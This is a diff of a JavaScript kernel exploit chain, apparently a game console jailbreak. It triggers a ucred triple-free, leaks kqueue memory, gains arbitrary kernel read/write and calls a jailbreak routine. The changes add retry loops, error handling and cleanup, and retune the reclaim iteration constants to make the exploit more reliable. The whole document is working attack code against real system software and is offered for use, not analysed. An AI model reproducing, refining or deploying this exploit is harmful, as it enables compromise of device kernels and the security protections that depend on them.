@@ -999,58 +999,84 @@ function setup_log_screen() {
   };
 }
 function yield_to_render(callback) {
-  if (exploit_end) return;            // ← لو خلصنا، امنع أي فازة متأخرة
+  if (exploit_end) return;
   if (typeof callback !== 'function') return;
 
   jsmaf.setTimeout(function () {
-    if (exploit_end) return;          // ← حماية إضافية
+    if (exploit_end) return;
+
     try {
       callback();
     } catch (e) {
       log('ERROR: ' + e.message);
       cleanup(true);
+
       if (typeof show_fail === 'function') {
         show_fail();
       }
     }
-  }, 0);
+  }, 8);   // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
-
 var exploit_count = 0;
 var exploit_end   = false;
 function netctrl_exploit() {
   setup_log_screen();
+
   var supported_fw = init();
   if (!supported_fw) {
+    log('Unsupported firmware — exploit aborted.');
     return;
   }
+
   log('Setting up exploit...');
+  exploit_end   = false;
+  exploit_count = 0;
+
   yield_to_render(exploit_phase_setup);
 }
+
 function exploit_phase_setup() {
-  var ok = setup();
+  if (exploit_end) return;
+
+  var ok = false;
+  try { ok = setup(); }
+  catch(e) { ok = false; }
+
   if (!ok) {
-    log('Setup failed, aborting exploit.');
+    log('Setup failed — aborting.');
+    cleanup();
+    exploit_end = true;
     return;
   }
+
   log('Workers spawned');
   exploit_count = 0;
-  exploit_end = false;
+  exploit_end   = false;
+
   yield_to_render(exploit_phase_trigger);
 }
+
 function exploit_phase_trigger() {
+  if (exploit_end) return;
 
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed to acquire kernel R/W - Retrying exploit.');
+    log('Max attempts reached — stopping.');
     cleanup();
+    exploit_end = true;
     return;
   }
 
   exploit_count++;
-  log('Triggering... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')');
+  log('Triggering attempt ' + exploit_count + '/' + MAIN_LOOP_ITERATIONS);
 
-  if (!trigger_ucred_triplefree()) {
-    log('Triplefree failed — Retrying exploit.');
+  let ok = false;
+  try { ok = trigger_ucred_triplefree(); }
+  catch(e) { ok = false; }
+
+  if (!ok) {
+    log('Trigger failed — retrying...');
+    cleanup();
+    sched_yield();
     yield_to_render(exploit_phase_trigger);
     return;
   }
@@ -1059,19 +1085,37 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
-  if (!leak_kqueue_safe()) {
-    log('[leak_safe] failed, retrying...');
-    log('[leak_safe] Retrying_leak...');
+  if (exploit_end) return;
+
+  let ok = false;
+  try { ok = leak_kqueue_safe(); }
+  catch(e) { ok = false; }
+
+  if (!ok) {
+    log('Leak failed — retrying...');
+    cleanup();
+    sched_yield();
     yield_to_render(exploit_phase_trigger);
     return;
   }
-  log('Exploit Read/Write...');
-  log('Stability by M.ELHOUT');
+
+  log('Preparing R/W...');
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
-  setup_arbitrary_rw();
-  log('Stability by M.ELHOUT...');
+  if (exploit_end) return;
+
+  try {
+    setup_arbitrary_rw();
+  } catch(e) {
+    log('R/W setup failed — retrying...');
+    cleanup();
+    sched_yield();
+    yield_to_render(exploit_phase_trigger);
+    return;
+  }
+
+  log('R/W OK — moving to jailbreak...');
   yield_to_render(exploit_phase_jailbreak);
 
   utils.notify('Jailbreak Success');
@@ -1079,9 +1123,14 @@ function exploit_phase_rw() {
   utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem >');
 }
 function exploit_phase_jailbreak() {
-  jailbreak();
+  if (exploit_end) return;
+
+  try { jailbreak(); }
+  catch(e) { log('Jailbreak error.'); }
+
   log('Jailbreak completed successfully');
   cleanup();
+  exploit_end = true;
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1738,12 +1787,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 2000;
-var KWRITE_MAX_UIO_RECLAIM = 2000;
+var KREAD_MAX_UIO_RECLAIM  = 1200;
+var KWRITE_MAX_UIO_RECLAIM = 1200;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM  = 500;
-var KWRITE_MAX_IOV_RECLAIM = 500;
+var KREAD_MAX_IOV_RECLAIM  = 300;
+var KWRITE_MAX_IOV_RECLAIM = 300;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 3;
